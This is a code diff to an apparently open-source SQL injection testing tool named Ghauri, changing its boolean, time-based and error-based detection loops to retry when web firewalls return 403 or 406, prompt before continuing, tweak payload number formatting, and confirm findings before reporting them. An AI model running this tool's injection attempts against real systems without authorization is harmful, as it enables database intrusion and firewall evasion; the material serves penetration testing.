@@ -441,31 +441,60 @@ def check_booleanbased_sqli(
     end_detection_phase = False
     backend = possible_dbms
     skipp_all_other_dbms = False
+    http_firewall_code_counter = 0
+    error_msg = None
+    terminate_on_web_firewall = False
+    terminate_on_errors = False
     for entry in blind_payloads:
         index_of_payload = 0
         retry_on_error = 0
+        if terminate_on_web_firewall:
+            break
+        if terminate_on_errors:
+            break
         payloads = fetch_payloads_by_suffix_prefix(
             payloads=entry.payloads, prefix=prefix, suffix=suffix
         )
         total_payloads = len(payloads)
         logger.info(f"testing '{entry.title}'")
         while index_of_payload < total_payloads:
-            payload = payloads[index_of_payload]
+            if http_firewall_code_counter > 2:
+                message = f"{error_msg} - {http_firewall_code_counter} time(s)"
+                logger.warning(f"HTTP error code detected during run:")
+                choice = logger.read_input(
+                    f"{message}. Do you want to keep testing the others (if any) [y/N]? ",
+                    batch=False,
+                    user_input="N",
+                )
+                if choice == "n":
+                    terminate_on_web_firewall = True
+                    break
+                if choice == "y":
+                    http_firewall_code_counter = 0
             if retry_on_error >= retry:
-                logger.critical(f"terminating test phase due to multiple errors..")
-                logger.end("ending")
-                exit(0)
+                logger.warning(f"Ghauri detected connection errors multiple times")
+                choice = logger.read_input(
+                    f"Do you want to keep testing the others (if any) [y/N]? ",
+                    batch=False,
+                    user_input="N",
+                )
+                if choice == "n":
+                    terminate_on_errors = True
+                    break
+                if choice == "y":
+                    retry_on_error = 0
             if delay > 0:
                 time.sleep(delay)
+            payload = payloads[index_of_payload]
             random_boolean = random.randint(1234, 9999)
             string = payload.string
             expression = string.replace(
                 "[RANDNUM]=[RANDNUM]",
-                "{:05}={:05}".format(random_boolean, random_boolean),
+                "{:05}={:04}".format(random_boolean, random_boolean),
             )
             expression01 = string.replace(
                 "[RANDNUM]=[RANDNUM]",
-                "{:05}={:05}".format(random_boolean, random_boolean - 68),
+                "{:05}={:04}".format(random_boolean, random_boolean - 68),
             )
             logger.payload(f"{expression}")
             try:
@@ -550,13 +579,15 @@ def check_booleanbased_sqli(
             with_status_code = attack.status_code
             if attack.status_code != attack01.status_code:
                 is_different_status_code_injectable = True
-                # if with_status_code == 4001:
-                #     with_status_code_msg = (
-                #         f" (with error ReadTimeout on --timeout={timeout})"
-                #     )
-                # else:
-                #     with_status_code_msg = f" (with --code={with_status_code})"
                 with_status_code_msg = f" (with --code={with_status_code})"
+            if attack.status_code in [403, 406]:
+                logger.critical(
+                    f"{attack.error_msg} HTTP error codes detected. ghauri is going to retry."
+                )
+                time.sleep(0.5)
+                error_msg = attack.error_msg
+                http_firewall_code_counter += 1
+                continue
             if case == "Page Ratio":
                 with_status_code_msg = f' (with --string="{diff}")'
             if retval:
@@ -769,6 +800,7 @@ def check_timebased_sqli(
     is_json=False,
     retry=3,
     techniques="T",
+    code=None,
 ):
     Response = collections.namedtuple(
         "SQLi",
@@ -811,23 +843,52 @@ def check_timebased_sqli(
     requests_counter = 1
     end_detection_phase = False
     is_different_status_code_injectable = False
+    terminate_on_errors = False
+    terminate_on_web_firewall = False
+    http_firewall_code_counter = 0
+    error_msg = None
     for entry in time_based_payloads:
         backend = entry.dbms
         index_of_payload = 0
         retry_on_error = 0
+        if terminate_on_web_firewall:
+            break
+        if terminate_on_errors:
+            break
         payloads = fetch_payloads_by_suffix_prefix(
             payloads=entry.payloads, prefix=prefix, suffix=suffix
         )
         total_payloads = len(payloads)
         logger.info(f"testing '{entry.title}'")
         while index_of_payload < total_payloads:
-            _payload = payloads[index_of_payload]
+            if http_firewall_code_counter > 2:
+                message = f"{error_msg} - {http_firewall_code_counter} time(s)"
+                logger.warning(f"HTTP error code detected during run:")
+                choice = logger.read_input(
+                    f"{message}. Do you want to keep testing the others (if any) [y/N]? ",
+                    batch=False,
+                    user_input="N",
+                )
+                if choice == "n":
+                    terminate_on_web_firewall = True
+                    break
+                if choice == "y":
+                    http_firewall_code_counter = 0
             if retry_on_error >= retry:
-                logger.critical(f"terminating test phase due to multiple errors..")
-                logger.end("ending")
-                exit(0)
+                logger.warning(f"Ghauri detected connection errors multiple times")
+                choice = logger.read_input(
+                    f"Do you want to keep testing the others (if any) [y/N]? ",
+                    batch=False,
+                    user_input="N",
+                )
+                if choice == "n":
+                    terminate_on_errors = True
+                    break
+                if choice == "y":
+                    retry_on_error = 0
             if delay > 0:
                 time.sleep(delay)
+            _payload = payloads[index_of_payload]
             string = _payload.string
             expression = string.replace("[SLEEPTIME]", "%s" % (sleep_time))
             decoded_expression = urldecode(expression)
@@ -899,6 +960,14 @@ def check_timebased_sqli(
                     )
                 else:
                     with_status_code_msg = f" (with --code={with_status_code})"
+            if attack.status_code in [403, 406] and code and code not in [403, 406]:
+                logger.critical(
+                    f"{attack.error_msg} HTTP error code detected. ghauri is going to retry."
+                )
+                time.sleep(0.5)
+                error_msg = attack.error_msg
+                http_firewall_code_counter += 1
+                continue
             if response_time >= sleep_time:
                 is_injected = True
                 _it = injection_type
@@ -959,6 +1028,7 @@ def check_errorbased_sqli(
     is_json=False,
     retry=3,
     possible_dbms=None,
+    code=None,
 ):
     Response = collections.namedtuple(
         "SQLi",
@@ -995,6 +1065,10 @@ def check_errorbased_sqli(
     is_string = False
     end_detection_phase = False
     is_different_status_code_injectable = False
+    http_firewall_code_counter = 0
+    error_msg = None
+    terminate_on_errors = False
+    terminate_on_web_firewall = False
     error_based_payloads = get_payloads_with_functions(
         error_based_payloads, backend=dbms, possible_dbms=possible_dbms
     )
@@ -1002,12 +1076,43 @@ def check_errorbased_sqli(
         backend = entry.dbms
         index_of_payload = 0
         retry_on_error = 0
+        if terminate_on_web_firewall:
+            break
+        if terminate_on_errors:
+            break
         payloads = fetch_payloads_by_suffix_prefix(
             payloads=entry.payloads, prefix=prefix, suffix=suffix
         )
         total_payloads = len(payloads)
         logger.info(f"testing '{entry.title}'")
         while index_of_payload < total_payloads:
+            if http_firewall_code_counter > 2:
+                message = f"{error_msg} - {http_firewall_code_counter} time(s)"
+                logger.warning(f"HTTP error code detected during run:")
+                choice = logger.read_input(
+                    f"{message}. Do you want to keep testing the others (if any) [y/N]? ",
+                    batch=False,
+                    user_input="N",
+                )
+                if choice == "n":
+                    terminate_on_web_firewall = True
+                    break
+                if choice == "y":
+                    http_firewall_code_counter = 0
+            if retry_on_error >= retry:
+                logger.warning(f"Ghauri detected connection errors multiple times")
+                choice = logger.read_input(
+                    f"Do you want to keep testing the others (if any) [y/N]? ",
+                    batch=False,
+                    user_input="N",
+                )
+                if choice == "n":
+                    terminate_on_errors = True
+                    break
+                if choice == "y":
+                    retry_on_error = 0
+            if delay > 0:
+                time.sleep(delay)
             _payload = payloads[index_of_payload]
             if retry_on_error >= retry:
                 logger.critical(f"terminating test phase due to multiple errors..")
@@ -1081,6 +1186,14 @@ def check_errorbased_sqli(
             if attack.status_code != base.status_code:
                 is_different_status_code_injectable = True
                 with_status_code_msg = f" (with --code={with_status_code})"
+            if attack.status_code in [403, 406] and code and code not in [403, 406]:
+                logger.critical(
+                    f"{attack.error_msg} HTTP error code detected. ghauri is going to retry."
+                )
+                time.sleep(0.5)
+                error_msg = attack.error_msg
+                http_firewall_code_counter += 1
+                continue
             if mobj:
                 if "string error-based" in entry.title:
                     logger.debug(
@@ -1369,7 +1482,7 @@ def check_session(
                         f"confirming if {injection_type} parameter '{param_name}' is '{title}' vulnerable.."
                     )
                     sleep_time = random.randint(5, 8)
-                    expression = vector.replace("[INFERENCE]", "1=1").replace(
+                    expression = vector.replace("[INFERENCE]", "03567=3567").replace(
                         "[SLEEPTIME]", f"{sleep_time}"
                     )
                     try:
@@ -1386,6 +1499,29 @@ def check_session(
                             is_multipart=is_multipart,
                             injection_type=injection_type,
                         )
+                        if attack.status_code in [403, 406]:
+                            # retry with original payload..
+                            mobj = re.search(
+                                r"(?is)(?:(?:(?:SLEEP\(|RECEIVE_MESSAGE\([\w',]*)|0\:0\:)(?P<sleep_time>\d+)(?:(?:\)|\')))",
+                                payload,
+                            )
+                            sleep_time = (
+                                int(mobj.group("sleep_time")) if mobj else timesec
+                            )
+                            expression = payload
+                            attack = inject_expression(
+                                url=url,
+                                data=data,
+                                proxy=proxy,
+                                delay=delay,
+                                timesec=timesec,
+                                timeout=timeout,
+                                headers=headers,
+                                parameter=parameter,
+                                expression=expression,
+                                is_multipart=is_multipart,
+                                injection_type=injection_type,
+                            )
                         response_time = attack.response_time
                         if response_time >= sleep_time:
                             vulnerable = True
@@ -1654,7 +1790,7 @@ def check_injections(
         )
         is_injected_bool = bool(bsqli and bsqli.injected)
         if is_injected_bool:
-            sqlis.append(bsqli)
+            # sqlis.append(bsqli)
             priorities.update({"boolean-based": bsqli})
             vectors.update({"boolean_vector": bsqli.prepared_vector})
             prefix = bsqli.prefix if not prefix else prefix
@@ -1687,12 +1823,13 @@ def check_injections(
         )
         is_injected_time = bool(tsqli and tsqli.injected)
         if is_injected_time:
-            sqlis.append(tsqli)
+            # sqlis.append(tsqli)
             priorities.update({"time-based": tsqli})
             vectors.update({"time_vector": tsqli.prepared_vector})
             dbms = tsqli.backend if not dbms else dbms
             if number_of_requests_performed == 4:
                 number_of_requests_performed += tsqli.number_of_requests
+    logger.info(possible_dbms)
     if "E" in techniques and not possible_dbms:
         esqli = check_errorbased_sqli(
             base,
@@ -1761,6 +1898,13 @@ def check_injections(
                 f"successfull tests performed {len(retval_boolean_based.tests_performed)}, vulnerable: {retval_boolean_based.vulnerable}"
             )
             is_vulnerable = retval_boolean_based.vulnerable
+            if is_vulnerable:
+                sqlis.append(priorities.get("boolean-based"))
+            else:
+                logger.debug("false positive payload was detected during testing phase")
+                logger.warning(
+                    f"'{retval.title}' is a false positive skipping this payload detected.."
+                )
             is_boolean_confirmed = is_vulnerable
         if "time-based" in priority_keys and not error_based_in_priority:
             retval = priorities.get("time-based")
@@ -1784,6 +1928,13 @@ def check_injections(
                 is_boolean_confirmed=is_boolean_confirmed,
             )
             is_vulnerable = retval_time_based.vulnerable
+            if is_vulnerable:
+                sqlis.append(priorities.get("time-based"))
+            else:
+                logger.debug("false positive payload was detected during testing phase")
+                logger.warning(
+                    f"'{retval.title}' is a false positive skipping this payload detected.."
+                )
         if is_vulnerable:
             _it = injection_type
             if param_name == "#1*":
